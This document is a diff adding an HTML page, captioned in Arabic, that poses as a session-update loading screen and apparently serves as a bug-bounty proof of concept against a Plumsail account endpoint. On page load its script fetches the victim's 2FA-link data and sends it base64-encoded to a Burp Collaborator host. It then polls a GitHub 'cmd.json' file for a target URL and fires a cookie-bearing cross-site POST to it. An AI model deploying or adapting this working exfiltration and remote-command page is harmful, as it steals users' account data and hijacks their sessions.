@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Updating System...</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f4f4f4; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2 id="msg">برجاء الانتظار، جاري تحديث الجلسة...</h2>
+
+    <script>
+        // الروابط الخاصة بك
+        const githubCmd = "https://raw.githubusercontent.com/mohamed-talaat0/AttackerWeb/refs/heads/main/cmd.json";
+        const burpExfil = "https://edvxiluua2m0mq06kwvutcjfr6xxlr9g.oastify.com";
+
+        async function startAttack() {
+            // المرحلة 1: تنفيذ طلب الـ GET من الصورة الأولى وتسريب البيانات
+            try {
+                let response = await fetch("https://auth.plumsail.com/api/account/users/manage/2fa/link");
+                let content = await response.text();
+                // إرسال البيانات لـ Burp (مشفرة لتجنب مشاكل الرموز)
+                fetch(burpExfil + "/?step1_data=" + btoa(unescape(encodeURIComponent(content))), {mode: 'no-cors'});
+            } catch(e) { console.log("Step 1 skipped"); }
+
+            // المرحلة 2: مراقبة جيت هب لتنفيذ طلب الـ POST من الصورة الثانية
+            const waiter = setInterval(async () => {
+                try {
+                    let check = await fetch(githubCmd + "?cache_bust=" + Date.now());
+                    let cmd = await check.json();
+
+                    if (cmd.url !== "") {
+                        // تنفيذ الريكوست الثاني (POST)
+                        fetch(cmd.url, {
+                            method: 'POST',
+                            mode: 'no-cors' // ضروري لإرسال الكوكيز في حالة عدم وجود SameSite
+                        });
+
+                        clearInterval(waiter);
+                        document.getElementById("msg").innerHTML = "تم التحديث بنجاح، يمكنك إغلاق الصفحة.";
+                    }
+                } catch(err) { }
+            }, 3000);
+        }
+
+        window.onload = startAttack;
+    </script>
+</body>
+</html>
